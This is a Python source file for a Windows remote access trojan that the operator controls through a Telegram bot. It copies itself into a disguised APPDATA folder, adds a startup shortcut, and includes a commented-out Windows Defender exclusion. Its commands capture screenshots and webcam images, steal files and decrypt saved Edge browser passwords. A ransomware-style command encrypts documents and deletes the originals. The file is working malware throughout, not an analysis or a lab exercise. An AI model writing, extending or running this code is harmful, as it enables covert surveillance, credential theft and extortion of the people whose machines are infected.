    #!/usr/bin/env python
import os
import platform
import telepot
import logging
import time 
import socket
import getpass
import subprocess
from PIL import ImageGrab
import cv2
import sqlite3
import win32crypt
import shutil
from sys import argv
from datetime import datetime
from win32com.client import Dispatch
import winshell
from cryptography.fernet import Fernet


# Setup logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Your bot configuration
token = ''  # Replace with actual token
known_ids = ['']  # Replace with your numeric chat ID
appname='sysutils'

#Add a single file to Windows Defender exclusions

#path = r"C:\users\bulls_eye\desktop\rat\let.py"
#woo = f'''
#New-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths" -Force | Out-Null;
#New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths" `
#-Name "{path}" -PropertyType DWORD -Value 0 -Force
#'''
#subprocess.run(
   # ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", woo],
    #check=True
#)


hide_folder = os.path.join(os.environ['APPDATA'], 'WINDOWS', 'SYSTEM32', 'appname')
if not os.path.exists(hide_folder):
    os.makedirs(hide_folder)
compiled_name=appname + '.exe'

startup_dir = winshell.startup()
target_shortcut = os.path.join(startup_dir, compiled_name.replace('.exe', '.lnk'))

# ensure hide folder and copy compiled binary there
os.makedirs(hide_folder, exist_ok=True)
hide_compiled = os.path.join(hide_folder, compiled_name)
shutil.copy2(argv[0], hide_compiled)

# create startup shortcut
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(target_shortcut)
shortcut.Targetpath = hide_compiled
shortcut.WorkingDirectory = hide_folder
shortcut.save()

# ensure logs folder and daily log file exist
os.makedirs('logs', exist_ok=True)
log_file = os.path.join('logs', f"{datetime.now():%Y-%m-%d}-log.txt")
if not os.path.exists(log_file):
	with open(log_file, 'w') as f:
		f.write('')


def file_decrypt(key, mylist):
	fernet = Fernet(key)

	for name in mylist:
		try:
			with open(name, 'rb') as f:
				data = f.read()

			decrypted = fernet.decrypt(data)

			# restore original filename
			original_name, _ = os.path.splitext(name)

			with open(original_name, 'wb') as f:
				f.write(decrypted)

			os.remove(name)

		except Exception:
			continue

def file_encrypt(full_path,key):
	if full_path !='*.py':
		with open (full_path,'rb') as f:
			data=f.read()
		fernet=Fernet(key)
		encrypted=fernet.encrypt(data)
		encrypted_file=full_path + '.encrypted'
		try:
			with open(encrypted_file,'wb') as f:
				f.write(encrypted)
				os.remove(full_path)
				return True
		except:
			response='not permitted'
			return False

def internalIP():
	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	internal_ip.connect(('8.8.8.8', 80))
	return internal_ip.getsockname()[0]

def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids

def send_safe_message(bot, chat_id, message):
	try:
		bot.sendMessage(chat_id, message)
		logging.info(f"Message sent to {chat_id}")
	except Exception as e:
		logging.error(f"Failed to send message: {e}")

def handle(msg):
	chat_id = msg['chat']['id']
	logging.info(f"Received message from {chat_id}: {msg}")
	
	if not checkchat_id(chat_id):
		logging.warning(f"Unauthorized access from {chat_id}")
		return
		
	if 'text' not in msg:
		return
		
	command = msg['text'].strip()
	response = ""
	
	if command == '/start':
		response = f"✅ Bot is active on {platform.uname()[1]}! Commands: /pwd, /ping, /help"
	elif command == '/pwd':
		response = f"📁 Current directory: {os.getcwd()}"
	elif command == '/ping':
		response = f"🏓 Pong! {platform.uname()[1]} is responsive"
	elif command == '/arp':
		bot.sendChatAction(chat_id, 'typing')
		try:
			res = os.popen(f'arp -a -N {internalIP()}').read().strip()
			bot.sendMessage(chat_id, res or 'No ARP entries found.')
		except Exception as e:
			bot.sendMessage(chat_id, f'Error: {e}')
	elif command == '/pc_info':
		import platform, getpass
		bot.sendChatAction(chat_id, 'typing')
		info = "\n".join(str(i) for i in platform.uname()) + f"\nUsername: {getpass.getuser()}"
		response = info
	elif command == '/capture_pc':
        	bot.sendChatAction(chat_id, 'typing')
        	screenshot = ImageGrab.grab()
        	screenshot.save('screenshot.jpg')
        	bot.sendChatAction(chat_id, 'upload_photo')
        	bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
	elif command == '/capture_webcam':
        	try:
        		camera = cv2.VideoCapture(0)
        		if camera.isOpened():
            			return_value, image = camera.read()
            			if return_value:
                			cv2.imwrite('webcam.jpg', image)
                			bot.sendPhoto(chat_id, open('webcam.jpg', 'rb'))
                			os.remove('webcam.jpg')
            			camera.release()
        	except Exception as e:
        		bot.sendMessage(chat_id, f'Webcam error: {e}')
	elif command == '/reboot':
		bot.sendChatAction(chat_id, 'typing')
		os.system('shutdown /r /f /t 0')
		response = 'Computer will be restarted NOW.'
	elif command == '/shutdown':
		bot.sendChatAction(chat_id, 'typing')
		os.system('shutdown /s /f /t 0')
		response = 'Computer will be shutdown NOW.'
	elif command == '/get_edge':
		bot.sendChatAction(chat_id, 'typing')
		try:
			import sqlite3, json, base64
			from crypto.Cipher import AES
			import win32crypt
		
			# Get AES key
			with open(os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Local State', 'r') as f:
				encrypted_key = base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:]
				key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

			# Decrypt passwords
			con = sqlite3.connect(os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data')
			cursor = con.cursor()
			response = ""
		
			for url, user, pwd in cursor.execute("SELECT origin_url, username_value, password_value FROM logins"):
				if pwd:
					print(f"Decrypting: {url}")
					try:
						nonce, ciphertext, tag = pwd[3:15], pwd[15:-16], pwd[-16:]
						cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
						password = cipher.decrypt_and_verify(ciphertext, tag).decode()
						response += f'Site: {url}\nUser: {user}\nPass: {password}\n\n'
					except Exception as e:
						print(f"Failed: {e}")
						continue
		
			con.close()
			response = response or "No passwords found."
		
		except Exception as e:
			response = f"Error: {e}"
	elif command.startswith('/download'):
		bot.sendChatAction(chat_id, 'typing')
		path = command.replace('/download', '').strip()
		if not path:
			response = '/download C:/path/to/file.name or /download file.name'
		else:
			bot.sendChatAction(chat_id, 'upload_document')
			try:
				bot.sendDocument(chat_id, open(path, 'rb'))
				response = f'Sent: {path}'
			except:
				try:
					bot.sendDocument(chat_id, open(os.path.join(hide_folder, path), 'rb'))
					response = f'Found in hide_folder: {hide_folder}'
				except:
					response = f'Could not find {path}'
	elif command.startswith('/ls'):
		path = command.replace('/ls', '').strip() or os.getcwd()
		try:
			files = '\n'.join(os.listdir(path))
			response = files if files else '(empty folder)'
		except Exception as e:
			response = f'Error: {e}'
	elif command == '/tasklist':
		try:
			response = '\n'.join([line.rstrip() for line in os.popen('tasklist').readlines() if line.strip()])
		except Exception as e:
			response = f'Error: {e}'
	elif command.startswith('/cd'):
		path = command.replace('/cd', '').strip()
		try:
			os.chdir(path)
			response = os.getcwd() + '>'
		except FileNotFoundError:
			response = f'Folder not found: {path}'

	elif command.startswith('/encrypt'):
		path = command.replace('/encrypt', '').strip()
	
		if not path:
			response = '/encrypt pathtothefile'
		else:
			try:
				key = Fernet.generate_key()
				mylist = ['.pdf', '.doc', '.pptx', '.xlsx']
				encrypted = False

				for root, dirs, files in os.walk(path):
					for file in files:
						if any(file.endswith(ext) for ext in mylist):
							full_path = os.path.join(root, file)
							file_encrypt(full_path, key)
							encrypted = True

				if encrypted:
					response = f'Files encrypted 💪👹 The encryption key is: {key}'
				else:
					response = 'No matching files found to encrypt.'
		
			except Exception as e:
				response = f'Encryption failed: {e}'
	elif command.startswith('/decrypt'):
		parts = command.split(' ', 2)

		if len(parts) < 3:
			response = 'Usage: /decrypt <key> <path>'
		else:
			_, key, path = parts
			path = path.strip()

			try:
				mylist = []

				for root, dirs, files in os.walk(path):
					for file in files:
						if file.endswith(".encrypted"):
							mylist.append(os.path.join(root, file))

				if not mylist:
					response = 'No encrypted files found.'
				else:
				# Fernet expects bytes
					file_decrypt(key.encode(),mylist)
					response = 'File decryption successful'

			except Exception as e:
				response = f'Decryption failed: {e}'

	
	elif command == '/help':
		response = "Available commands: /start, /pwd, /ping, /help"
	else:
		response = "❌ Unknown command. Use /help" 
	
	if response:
		send_safe_message(bot, chat_id, response)
		logging.info(f"Response sent: {response}")

# Main execution
if __name__ == "__main__":
	if token == 'YOUR_BOT_TOKEN_HERE':
		logging.error("❌ Bot token not configured!")
		exit(1)
		
	logging.info("🤖 Starting Telegram bot...")
	bot = telepot.Bot(token)
	
	# Send startup message
	if known_ids and known_ids[0] != 'YOUR_CHAT_ID_HERE':
		send_safe_message(bot, known_ids[0], f"🚀 {platform.uname()[1]} is now online!")
	
	logging.info("📱 Bot started, waiting for messages...")
	bot.message_loop(handle)
	
	# Keep the script running
	while True:
		time.sleep(10)#!/usr/bin/env python

